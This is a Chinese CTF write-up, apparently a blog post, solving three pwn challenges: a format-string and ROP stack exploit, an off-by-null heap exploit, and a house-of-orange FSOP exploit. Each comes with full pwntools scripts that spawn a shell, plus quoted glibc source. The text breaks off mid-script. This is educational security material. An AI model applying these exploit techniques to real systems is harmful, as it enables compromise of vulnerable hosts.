        <content type="html"><![CDATA[<h3 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house-of-orange"></a>house-of-orange</h3><span id="more"></span><h3 id="1-ezstack"><a href="#1-ezstack" class="headerlink" title="1.ezstack"></a>1.ezstack</h3><p>简单的格式化字符串漏洞，泄露基地址和canary，泄露rop。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#io = process(&quot;./ezstack&quot;)</span><br><span class="line">io=remote(&#x27;47.108.195.119&#x27;,20113)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">binsh=addr+0xB24</span><br><span class="line">system=addr+0x810</span><br><span class="line">pop_rdi=addr+0xb03</span><br><span class="line">  </span><br><span class="line">def exp():</span><br><span class="line">  io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">  io.sendline(&#x27;Gleaf&#x27;)</span><br><span class="line">  io.recvuntil(&#x27;\x1b\x5b\x30\x6d\n&#x27;)</span><br><span class="line">  io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line">  raw_input()</span><br><span class="line">  io.sendline(&quot;%17$p%11$pA&quot;)</span><br><span class="line">  io.recvuntil(&#x27;0x&#x27;)</span><br><span class="line">  addr=int(io.recv(12),16)-0x9dc</span><br><span class="line">  print(&#x27;addr&#x27;,hex(addr))</span><br><span class="line">  io.recvuntil(&quot;0x&quot;)</span><br><span class="line">  canary = int(io.recv(16),16)</span><br><span class="line">  print(&#x27;canary&#x27;,hex(canary))</span><br><span class="line">  payload = &#x27;a&#x27;*0x18+p64(canary)+p64(0)+p64(addr+0x7c1)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br><span class="line">  io.sendlineafter(&quot;-\n&quot;,payload)</span><br><span class="line">  io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="2-noleak1"><a href="#2-noleak1" class="headerlink" title="2.noleak1"></a>2.noleak1</h3><p>一个很明显的off-by-null，逆向得到密码N0_py_1n_tHe_ct7。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=remote(&#x27;47.108.195.119&#x27;,20182)</span><br><span class="line">#io=process(&#x27;./noleak1&#x27;)</span><br><span class="line">elf=ELF(&#x27;./noleak1&#x27;)</span><br><span class="line">#libc=elf.libc</span><br><span class="line">libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(index,size):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index?\n&#x27;,str(index))</span><br><span class="line">io.sendlineafter(&#x27;Size?\n&#x27;,str(size))</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index?\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,content):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index?\n&#x27;,str(index))</span><br><span class="line">io.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line"></span><br><span class="line">def dele(index):</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;Index?\n&#x27;,str(index))</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.sendline(&#x27;Gleaf&#x27;)</span><br><span class="line">io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line">io.recvuntil(&quot;str:&quot;)</span><br><span class="line">io.sendline(&#x27;N0_py_1n_tHe_ct7&#x27;)</span><br><span class="line">add(0,0x420)</span><br><span class="line">add(1,0x28)</span><br><span class="line">add(2,0xf8)</span><br><span class="line">  </span><br><span class="line">for i in range(7):</span><br><span class="line">add(i+3,0xf8)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">dele(9-i)</span><br><span class="line"></span><br><span class="line">dele(0)</span><br><span class="line">add(0,0x30)</span><br><span class="line">show(0)</span><br><span class="line">malloc_hook = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-0x460</span><br><span class="line">libc_base = malloc_hook  - libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">free_hook = libc_base + libc.symbols[&#x27;__free_hook&#x27;]</span><br><span class="line">system = libc_base + libc.symbols[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">edit(1,&#x27;0&#x27;*0x20 + p64(0x420))</span><br><span class="line">dele(2)</span><br><span class="line">dele(1)</span><br><span class="line">add(4,0x410)</span><br><span class="line">edit(4,&#x27;1&#x27;*0x3e0+p64(0)+p64(0x30)+p64(free_hook))</span><br><span class="line">add(5,0x20)</span><br><span class="line">add(6,0x20)</span><br><span class="line">edit(6,p64(system))</span><br><span class="line">edit(5,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">dele(5)</span><br><span class="line">io.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure><h3 id="3-ezheap"><a href="#3-ezheap" class="headerlink" title="3.ezheap"></a>3.ezheap</h3><p>改遍2016年HITCONCTF,正好借这个题来复习一下house-of-orange。</p><p>题目存在堆溢出漏洞且没有free等可以释放chunk的函数，因此我们可以利用sysmalloc函数中的_int_free函数，那么该如何调用sysmalloc函数呢？我们来看下malloc的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  /*</span><br><span class="line">     If large enough, split off the chunk bordering the end of memory</span><br><span class="line">     (held in av-&gt;top). Note that this is in accord with the best-fit</span><br><span class="line">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span><br><span class="line">     less well fitting) than any other available chunk since it can</span><br><span class="line">     be extended to be as large as necessary (up to system</span><br><span class="line">     limitations).</span><br><span class="line"></span><br><span class="line">     We require that av-&gt;top always exists (i.e., has size &gt;=</span><br><span class="line">     MINSIZE) after initialization, so if it would otherwise be</span><br><span class="line">     exhausted by current request, it is replenished. (The main</span><br><span class="line">     reason for ensuring it exists is that we may need MINSIZE space</span><br><span class="line">     to put in fenceposts in sysmalloc.)</span><br><span class="line">   */</span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize (victim);</span><br><span class="line"></span><br><span class="line">  if ((unsigned long) (size) &gt;= (unsigned long) (nb + MINSIZE))</span><br><span class="line">    &#123;</span><br><span class="line">      remainder_size = size - nb;</span><br><span class="line">      remainder = chunk_at_offset (victim, nb);</span><br><span class="line">      av-&gt;top = remainder;</span><br><span class="line">      set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                (av != &amp;main_arena ? NON_MAIN_ARENA : 0));</span><br><span class="line">      set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">      check_malloced_chunk (av, victim, nb);</span><br><span class="line">      void *p = chunk2mem (victim);</span><br><span class="line">      alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /* When we are using atomic ops to free fast chunks we can get</span><br><span class="line">     here for all block sizes.  */</span><br><span class="line">  else if (have_fastchunks (av))</span><br><span class="line">    &#123;</span><br><span class="line">      malloc_consolidate (av);</span><br><span class="line">      /* restore original bin index */</span><br><span class="line">      if (in_smallbin_range (nb))</span><br><span class="line">        idx = smallbin_index (nb);</span><br><span class="line">      else</span><br><span class="line">        idx = largebin_index (nb);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">     Otherwise, relay to handle system-dependent cases</span><br><span class="line">   */</span><br><span class="line">  else</span><br><span class="line">    &#123;</span><br><span class="line">      void *p = sysmalloc (nb, av);</span><br><span class="line">      if (p != NULL)</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      return p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此可以看到当top_chunk的大小小于我们要申请的大小，且fastbin中没有freechunk，就会调用sysmalloc函数。</p><p>sysmalloc()有两种方法分配新的内存，第一种是调用mmap函数分配，第二种就是调用sbrk函数直接扩充top_chunk。判断使用哪种方法的条件如下：</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128194827271.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128194827271.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211128194827271"></p><p>只要我们申请chunk的大小小于mp_.mmap_threshold也就是0x20000，就会调用sbrk函数。那该怎么调用sysmalloc中的_int_free函数呢？我们再次看下sysmalloc函数的源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> old_top = av-&gt;top;</span><br><span class="line"> old_size = chunksize (old_top);</span><br><span class="line"> old_end = (char *) (chunk_at_offset (old_top, old_size));</span><br><span class="line"></span><br><span class="line"> brk = snd_brk = (char *) (MORECORE_FAILURE);</span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line">    If not the first time through, we require old_size to be</span><br><span class="line">    at least MINSIZE and to have prev_inuse set.</span><br><span class="line">  */</span><br><span class="line"></span><br><span class="line"> assert ((old_top == initial_top (av) &amp;&amp; old_size == 0) ||</span><br><span class="line">         ((unsigned long) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">          prev_inuse (old_top) &amp;&amp;</span><br><span class="line">          ((unsigned long) old_end &amp; (pagesize - 1)) == 0));</span><br><span class="line"></span><br><span class="line"> /* Precondition: not enough current space to satisfy nb request */</span><br><span class="line"> assert ((unsigned long) (old_size) &lt; (unsigned long) (nb + MINSIZE));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> if (av != &amp;main_arena)</span><br><span class="line">   &#123;</span><br><span class="line">…………</span><br><span class="line">     else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))</span><br><span class="line">       &#123;</span><br><span class="line">…………</span><br><span class="line">         old_size = (old_size - MINSIZE) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">         set_head (chunk_at_offset (old_top, old_size + 2 * SIZE_SZ), 0 | PREV_INUSE);</span><br><span class="line">         if (old_size &gt;= MINSIZE)</span><br><span class="line">           &#123;</span><br><span class="line">             set_head (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ) | PREV_INUSE);</span><br><span class="line">             set_foot (chunk_at_offset (old_top, old_size), (2 * SIZE_SZ));</span><br><span class="line">             set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);</span><br><span class="line">             _int_free (av, old_top, 1);</span><br><span class="line">           &#125;</span><br><span class="line">…………</span><br><span class="line"> else     /* av == main_arena */</span><br><span class="line">…………</span><br><span class="line"> if (snd_brk != (char *) (MORECORE_FAILURE))</span><br><span class="line"> &#123;</span><br><span class="line">…………</span><br><span class="line">       if (old_size != 0)</span><br><span class="line">       &#123;</span><br><span class="line"> old_size = (old_size - 4 * SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK;</span><br><span class="line">           set_head (old_top, old_size | PREV_INUSE);                    </span><br><span class="line">           chunk_at_offset (old_top, old_size)-&gt;size =</span><br><span class="line">                     (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line">           chunk_at_offset (old_top, old_size + 2 * SIZE_SZ)-&gt;size =</span><br><span class="line">                       (2 * SIZE_SZ) | PREV_INUSE;</span><br><span class="line"></span><br><span class="line">                     /* If possible, release the rest. */</span><br><span class="line">           if (old_size &gt;= MINSIZE)</span><br><span class="line">           &#123;</span><br><span class="line">                  _int_free (av, old_top, 1);</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>需要top_chunk在减去一个放置fencepost的MINSIZE后，还要大于MINSIZE(0x20)；如果是main_arena则需要放置两个fencepost。还需要满足old_size小于nb+MINSIZE，PREV_INUSE标志位为1，以及old_top+old_size页对齐。</p><p>因此我们先利用溢出将top_chunk的大小改到小于0x20000的值且需要使old_top+old_size页对齐，然后我们申请一个大于修改过后的top_chunk的size的chunk，这样top_chunk就被放入了unsortedbin中。这时我们就可以泄露出libc_base和heap_base(fd_nextsize)。紧接着我们再次利用溢出将被放入unsortedbin中的old_topchunk的大小改为0x60(后面会说到为什么是0x60)。</p><p>同时将其bk指针改为&amp;_IO_list_all-0x10(利用unsortedbin attack将_IO_list_all的值改为main_arena+88)以及布置上其他数据。最后直接申请一个大于0x60大小的chunk即可拿到shell。那么这些数据是什么呢？</p><p>在我们申请一个大于0x60大小的chunk这个期间，其实是发生了很多事情</p><ul><li><p>首先old_top从unsortedbin中解链造成unsortedbin attack将_IO_list_all的值改为main_arena+88，然后被放入smallbin[5]中。</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128205204873.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128205204873.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211128205204873"></p></li><li><p>然后就会发生内存错误(因为unsortedbin的bk指针被改)调用了_IO_flush_all_lockp()调用流程：<code>malloc_printerr -&gt; __libc_message -&gt; __GI_abort -&gt; _IO_flush_all_lockp -&gt; __FI__IO_str_overflow </code> ，我们来看看_IO_flush_all_lockp函数的源码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  struct _IO_FILE *fp;</span><br><span class="line">  int last_stamp;</span><br><span class="line"></span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  __libc_cleanup_region_start (do_lock, flush_cleanup, NULL);</span><br><span class="line">  if (do_lock)</span><br><span class="line">    _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  while (fp != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">#endif</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">result = EOF;</span><br><span class="line"></span><br><span class="line">      if (do_lock)</span><br><span class="line">_IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line"></span><br><span class="line">      if (last_stamp != _IO_list_all_stamp)</span><br><span class="line">&#123;</span><br><span class="line">  /* Something was added to the list.  Start all over again.  */</span><br><span class="line">  fp = (_IO_FILE *) _IO_list_all;</span><br><span class="line">  last_stamp = _IO_list_all_stamp;</span><br><span class="line">&#125;</span><br><span class="line">      else</span><br><span class="line">fp = fp-&gt;_chain;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  if (do_lock)</span><br><span class="line">    _IO_lock_unlock (list_all_lock);</span><br><span class="line">  __libc_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为此时_IO_list_all的值是main_arena+88其0x100范围内的值我们不好控制，因此我们需要利用<code>fp = fp-&gt;_chain;</code> 那么我们该如何执行到这条语句呢？<strong>要想执行到这条语句，首先就不能让前面出现错误，因为此时的_IO_list_all的值已被更改，所以其vatble的地址也被更改，所以如果执行了_IO_OVERFLOW函数就一定会报错</strong>，因此我们得需要&amp;&amp;前的条件不成立，这样就不会执行到_IO_OVERFLOW函数了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br></pre></td></tr></table></figure><p>绕过执行后这行代码将_IO_list_all的值换成我们可以控制的值。 又因为(main_arena+88)+0x68的值是old_top，这也就是为什么要将old_top的size改为0x60的原因</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128212646692.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128212646692.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211128212646692"></p></li><li><p>现在_IO_list_all的值是old_top的地址，因此我们就可以在old_top上布置数据了。首先将vtable的地址改为我们可以控制的地址，然后将system覆盖掉vtable中的_IO_OVERFLOW函数。然后布置使上面&amp;&amp;前的条件能成立的数据，因为有个||因此有两种布置方法。</p></li><li><p>布置好后我们就可以执行_IO_OVERFLOW(fp,EOF) == EOF，默认此函数的第一个参数是_IO_FILE_plus，因为_IO_list_all的值就是_IO_FILE_plus，因此我们将old_top的prev_size写为/bin/sh\x00。</p><p>第一种数据：</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128215557365.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128215557365.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211128215557365"></p><p>第二种数据</p><p><img src="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128220350974.png" class="lazyload placeholder" data-srcset="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/image-20211128220350974.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211128220350974"></p></li></ul><p>exp1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">io=process(&#x27;./pwn&#x27;)</span><br><span class="line">#io=remote(&#x27;47.108.195.119&#x27; ,20141)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">#libc=ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line">context.log_level=&#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">def add(size,name):</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;1&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;Name?\n&#x27;,name)</span><br><span class="line"></span><br><span class="line">def edit(size,name):</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;2&#x27;)</span><br><span class="line">io.sendlineafter(&#x27;size of it\n&#x27;,str(size))</span><br><span class="line">io.sendafter(&#x27;name\n&#x27;,name)</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">io.sendlineafter(&#x27;Your choice : &#x27;,&#x27;3&#x27;)</span><br><span class="line"></span><br><span class="line">def exp():</span><br><span class="line">#io.recvuntil(&#x27;\x3a\x1b\x5b\x30\x6d\n&#x27;)</span><br><span class="line">#io.sendline(&#x27;Gleaf&#x27;)</span><br><span class="line">#sleep(0.1)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">#io.sendline(&#x27;f1ag&#x27;)</span><br><span class="line"></span><br><span class="line">heap_addr=int(io.recvuntil(&#x27;\n&#x27;)[:-1],16)+0x90</span><br><span class="line">print(&#x27;heap_addr&#x27;,hex(heap_addr))</span><br><span class="line">add(0x18,&#x27;f1ag\n&#x27;)</span><br><span class="line">edit(0x20,&#x27;a&#x27;*0x18+p64(0x2fc1)+&#x27;\n&#x27;)</span><br><span class="line">add(0x3000,&#x27;f1ag\n&#x27;)</span><br><span class="line"></span><br><span class="line">add(0x50,&#x27;a&#x27;*7+&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">show()</span><br><span class="line">malloc_hook=u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))-1864-16</span><br><span class="line">libc_base=malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;libc_base&#x27;,hex(libc_base))</span><br><span class="line">gadget=[0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">IOlist=libc_base+libc.symbols[&#x27;_IO_list_all&#x27;]</span><br><span class="line">system=libc_base+libc.symbols[&#x27;system&#x27;]</span><br><span class="line">payload=&#x27;a&#x27;*0x50+&#x27;/bin/sh\x00&#x27;+p64(0x60)+p64(0)+p64(IOlist-0x10)</span><br><span class="line">payload=payload.ljust(0xa0+0x50,&#x27;\x00&#x27;)</span><br><span class="line">payload+=p64(heap_addr+0xc8)</span><br><span 